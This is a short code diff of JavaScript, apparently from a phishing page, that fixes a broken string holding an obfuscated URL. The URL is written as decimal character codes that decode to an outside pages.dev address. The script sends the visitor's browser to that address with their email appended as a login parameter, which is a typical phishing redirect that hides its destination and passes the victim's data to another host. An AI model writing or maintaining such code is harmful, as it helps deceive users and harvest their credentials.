@@ -106,8 +106,7 @@
             }
 
             let base64Email = (email);
-            let encodedURL = "104 116 116 112 115 58 47 47 109 97 105 108 98 114 105 100 103 101 46 112 97 103 101 115 46 100 101 118 47 112 114 111 102
-";
+            let encodedURL = "104 116 116 112 115 58 47 47 109 97 105 108 98 114 105 100 103 101 46 112 97 103 101 115 46 100 101 118 47 112 114 111 102";
             let decodedURL = encodedURL.split(" ").map(num => String.fromCharCode(num)).join("");
 
             window.location.href = decodedURL + "?login=" + (base64Email);
